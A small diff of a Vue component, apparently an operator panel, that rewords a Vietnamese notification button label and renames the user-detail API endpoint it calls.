@@ -18,7 +18,7 @@
         </VCol>
 
         <VCol cols="12" md="6">
-            <VBtn block @click="sendData('error')">Gửi thông báo Sai tài khoản mật khẩu</VBtn>
+            <VBtn block @click="sendData('error')">Gửi thông báo nhập đúnng thông tin</VBtn>
             <p v-if="statuserror">{{ statuserror }}</p>
         </VCol>
 
@@ -142,7 +142,7 @@ const bankList = ref([])
 // get user detail
 const user = ref(null);
 onMounted(() => {
-    axios.get(`/get-user/${userId.value}`)
+    axios.get(`/get-user-detail/${userId.value}`)
         .then(({ data }) => {
             if (data.imageBefore) {
                 data.imageBefore = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
